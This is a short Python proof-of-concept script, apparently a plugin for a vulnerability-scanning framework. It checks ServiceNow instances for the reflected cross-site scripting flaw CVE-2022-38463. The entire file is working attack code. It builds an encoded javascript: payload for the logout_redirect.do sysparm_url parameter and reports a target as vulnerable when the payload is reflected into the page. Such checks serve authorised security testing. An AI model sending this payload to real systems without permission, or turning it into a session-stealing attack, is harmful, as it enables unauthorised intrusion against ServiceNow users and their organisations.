# title: ServiceNow - Cross-Site Scripting CVE-2022-38463
# author: antx
# cveid: CVE-2022-38463

from poctools import BasicPoc


class APoc(BasicPoc):
    def __init__(self):
        super(APoc, self).__init__()
        self.name = 'A-Poc'

    def verify(self, url: str):
        url = url.rstrip("/")
        target = f"{url}/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)"
        try:
            resp = self.get(target)
            if resp.status_code == 200 and "top.location.href = 'javascript:alert(document.domain)';" in resp.text and 'text/html' in resp.headers['Content-Type']:
                return True
        except Exception as e:
            pass
        return False


if __name__ == '__main__':
    target = 'https://127.0.0.1'
    tp = APoc()
    result = tp.run(url=target)
    print(f'{target} -> {result}')
